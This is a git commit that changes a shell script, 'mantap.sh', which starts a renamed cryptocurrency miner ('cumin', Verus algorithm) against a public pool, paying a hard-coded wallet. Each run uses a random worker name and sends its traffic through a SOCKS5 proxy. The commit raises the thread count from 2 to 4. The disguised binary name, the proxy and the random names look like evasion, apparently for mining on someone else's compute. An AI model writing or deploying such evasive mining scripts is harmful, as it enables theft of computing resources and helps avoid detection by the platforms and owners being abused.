76d4fbb5283cd8e624886f63f643f0965a548321
wreytrfser <86676957+wreytrfser@users.noreply.github.com>
2021-08-04 11:51:46 +0700

    Update mantap.sh

--- mantap.sh
+++ mantap.sh
@@ -7,4 +7,4 @@ POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RDpbTQzyf4R8FQJjzwQDjs7nzfxui9JcgF
 WORKER=$(echo $(shuf -i 1-10 -n 1)gass)
 PROXY=socks5://184.179.216.130:4145
-./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 4 -x $PROXY
